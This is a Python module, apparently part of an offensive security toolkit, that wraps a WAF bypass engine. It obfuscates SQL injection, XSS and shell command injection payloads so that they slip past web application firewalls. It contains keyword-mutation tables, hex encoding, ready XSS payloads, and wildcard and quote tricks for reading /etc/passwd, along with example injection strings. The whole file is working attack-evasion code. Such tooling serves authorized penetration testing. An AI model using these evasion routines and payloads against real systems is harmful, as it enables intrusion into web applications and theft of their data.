"""DRAKBEN WAF EVASION ENGINE (Legacy Wrapper)
Description: Backward-compatible wrapper for the new WAFBypassEngine.
Author: @ahmetdrak

This module maintains backward compatibility with existing code while
delegating to the new, more powerful WAFBypassEngine.

For new code, use WAFBypassEngine directly:
    from modules.waf_bypass_engine import WAFBypassEngine
"""

from __future__ import annotations

import binascii
import secrets

# Import new engine
try:
    from modules.waf_bypass_engine import PayloadType, WAFBypassEngine
    _HAS_NEW_ENGINE = True
except ImportError:
    _HAS_NEW_ENGINE = False
    PayloadType = None  # type: ignore
    WAFBypassEngine = None  # type: ignore


class WAFEvasion:
    """Polymorphic WAF Evasion Engine (Legacy API).

    This class provides backward compatibility with the old API while
    using the new WAFBypassEngine under the hood for better results.

    For new code, prefer using WAFBypassEngine directly.
    """

    def __init__(self) -> None:
        # Initialize new engine if available
        if _HAS_NEW_ENGINE:
            self._engine = WAFBypassEngine()
        else:
            self._engine = None

        # Legacy keyword mappings (kept for fallback)
        self.sql_keywords = {
            "UNION": [
                "/*!UNION*/",
                "/*!50000UNION*/",
                "Uni/**/on",
                "%55nion",
                "UN%0aION",
            ],
            "SELECT": [
                "/*!SELECT*/",
                "/*!50000SELECT*/",
                "Se/**/lect",
                "%53elect",
                "SE%0aLECT",
            ],
            "FROM": ["/*!FROM*/", "/*!50000FROM*/", "Fr/**/om", "%46rom"],
            "WHERE": ["/*!WHERE*/", "Wh/**/ere"],
            "OR": ["||", "/*!OR*/", "/*!50000OR*/", "%26%26"],
            "AND": ["&&", "/*!AND*/", "/*!50000AND*/", "%26"],
            " ": ["/**/", "%09", "%0a", "%0b", "%0c", "%0d", "+"],
        }

    def _obfuscate_whitespace(self, payload: str) -> str:
        """Replace spaces with random comment-based evasion."""
        method = secrets.choice(self.sql_keywords[" "])
        return payload.replace(" ", method)

    def _obfuscate_keywords(self, payload: str) -> str:
        """Replace SQL keywords with obfuscated versions."""
        obfuscated = payload
        for kw, variations in self.sql_keywords.items():
            if kw == " ":
                continue
            if kw not in obfuscated.upper():
                continue
            replacement = secrets.choice(variations)
            idx = obfuscated.upper().find(kw)
            while idx != -1:
                obfuscated = obfuscated[:idx] + replacement + obfuscated[idx + len(kw):]
                idx = obfuscated.upper().find(kw, idx + len(replacement))
        return obfuscated

    def _obfuscate_hex_encoding(self, payload: str) -> str:
        """Encode string literals to hex for WAF bypass."""
        if "'" not in payload:
            return payload
        parts = payload.split("'")
        new_parts = []
        for i, part in enumerate(parts):
            if i % 2 == 1:  # Inside quotes
                hex_val = "0x" + binascii.hexlify(part.encode()).decode()
                new_parts.append(hex_val)
            else:
                new_parts.append(part)
        return "".join(new_parts)

    def obfuscate_sql(self, payload: str, aggressiveness: int = 2) -> str:
        """Obfuscate SQL Injection payload.

        Uses new WAFBypassEngine if available, falls back to legacy.
        Aggressiveness: 1 (Basic) -> 3 (Extreme/Experimental).
        """
        # Try new engine first
        if self._engine is not None and PayloadType is not None:
            try:
                results = self._engine.bypass_sql(
                    payload=payload,
                    aggressiveness=aggressiveness,
                )
                if results:
                    return results[0]
            except Exception:
                pass  # Fall back to legacy

        # Legacy implementation
        obfuscated = payload

        if aggressiveness >= 1:
            obfuscated = self._obfuscate_whitespace(obfuscated)

        if aggressiveness >= 2:
            obfuscated = self._obfuscate_keywords(obfuscated)

        if aggressiveness >= 3:
            obfuscated = self._obfuscate_hex_encoding(obfuscated)

        return obfuscated

    def obfuscate_xss(self, payload: str) -> str:
        """Obfuscate XSS payload using tag/attribute mutation.

        Uses new WAFBypassEngine if available.
        """
        # Try new engine first
        if self._engine is not None and PayloadType is not None:
            try:
                results = self._engine.bypass_xss(
                    payload=payload,
                )
                if results:
                    return results[0]
            except Exception:
                pass  # Fall back to legacy

        # Legacy implementation
        # 1. Case Randomization: <script> -> <ScRiPt>
        chars = list(payload)
        for i in range(len(chars)):
            if secrets.choice([True, False]):
                chars[i] = chars[i].upper()

        mutated = "".join(chars)

        # 2. Protocol Wrappers: javascript: -> java	script: (Tab)
        if "javascript:" in mutated.lower():
            mutated = mutated.replace(":", "\t:")

        # 3. Double Check: SVG payload if script is blocked
        if "<script" in payload.lower():
            # Return a polymorphic variation
            variations = [
                mutated,
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<body/onload=alert(1)>",
            ]
            return secrets.choice(variations)

        return mutated

    def _shell_concat_obfuscate(self, payload: str) -> str:
        """Obfuscate using string concatenation: cat -> c'a't."""
        new_payload = ""
        for char in payload:
            if char.isalnum():
                new_payload += f"'{char}'"
            else:
                new_payload += char
        return new_payload.replace("''", "")  # Cleanup

    def _shell_wildcard_obfuscate(self, payload: str) -> str:
        """Obfuscate using wildcard injection: /etc/passwd -> /e??/p??swd."""
        parts = payload.split("/")
        new_parts = []
        for part in parts:
            if len(part) > 2:
                chars = list(part)
                idx = secrets.randbelow(len(chars) - 1) + 1
                chars[idx] = "?"
                new_parts.append("".join(chars))
            else:
                new_parts.append(part)
        return "/".join(new_parts)

    def obfuscate_shell(self, payload: str) -> str:
        """Obfuscate OS Command Injection (Bash/Linux).

        Uses new WAFBypassEngine if available.
        cat /etc/passwd -> c''a''t /e??/p?s??d.
        """
        # Try new engine first
        if self._engine is not None and PayloadType is not None:
            try:
                results = self._engine.bypass_rce(
                    payload=payload,
                )
                if results:
                    return results[0]
            except Exception:
                pass  # Fall back to legacy

        # Legacy: String Concatenation (50% chance)
        if secrets.choice([True, False]):
            return self._shell_concat_obfuscate(payload)

        # Legacy: Wildcard Injection
        if "/" in payload:
            return self._shell_wildcard_obfuscate(payload)

        return payload


    # === NEW API METHODS (delegate to engine) ===

    def get_engine(self) -> WAFBypassEngine | None:
        """Get the underlying WAFBypassEngine instance.

        Returns None if new engine is not available.
        """
        return self._engine

    def fingerprint_waf(self, target: str) -> dict | None:
        """Fingerprint WAF on target (requires new engine).
        Note: WAFBypassEngine.fingerprint_waf needs response data, not URL.
        This is a convenience wrapper that returns None if no response data available.
        """
        # WAFBypassEngine.fingerprint_waf requires (headers, body, status_code, cookies)
        # Without actual HTTP response data, we cannot fingerprint
        return None

    def generate_advanced_bypass(
        self,
        payload: str,
        payload_type: str = "sqli",
        count: int = 10,
    ) -> list[str]:
        """Generate multiple bypass variants using new engine.

        Args:
            payload: Original payload
            payload_type: "sqli", "xss", "rce", "lfi", "ssti"
            count: Number of variants to generate

        Returns:
            List of bypass variants
        """
        if self._engine is None or PayloadType is None:
            # Fall back to legacy single variant
            if payload_type == "sqli":
                return [self.obfuscate_sql(payload)]
            elif payload_type == "xss":
                return [self.obfuscate_xss(payload)]
            elif payload_type == "rce":
                return [self.obfuscate_shell(payload)]
            return [payload]

        # Map string type to enum
        type_map = {
            "sqli": PayloadType.SQLI,
            "xss": PayloadType.XSS,
            "rce": PayloadType.RCE,
            "lfi": PayloadType.LFI,
            "ssti": PayloadType.SSTI,
        }
        ptype = type_map.get(payload_type.lower(), PayloadType.SQLI)

        # Use the correct bypass method based on type
        bypass_methods = {
            PayloadType.SQLI: lambda: self._engine.bypass_sql(payload=payload, aggressiveness=min(count, 3)),
            PayloadType.XSS: lambda: self._engine.bypass_xss(payload=payload, aggressiveness=min(count, 3)),
            PayloadType.RCE: lambda: self._engine.bypass_rce(payload=payload, aggressiveness=min(count, 3)),
        }
        method = bypass_methods.get(ptype, bypass_methods[PayloadType.SQLI])
        results = method()
        return results[:count] if results else [payload]


# Convenience function for quick access
def create_waf_bypass_engine() -> WAFBypassEngine | None:
    """Create a new WAFBypassEngine instance.

    Returns None if new engine is not available.
    """
    if _HAS_NEW_ENGINE:
        return WAFBypassEngine()
    return None


# Usage Example:
# waf = WAFEvasion()
# print(waf.obfuscate_sql("UNION SELECT 1,2"))
# -> Uses new engine if available, otherwise legacy
#
# # Or use new engine directly:
# from modules.waf_bypass_engine import WAFBypassEngine, PayloadType
# engine = WAFBypassEngine()
# result = engine.generate_bypass("' OR 1=1--", PayloadType.SQLI)
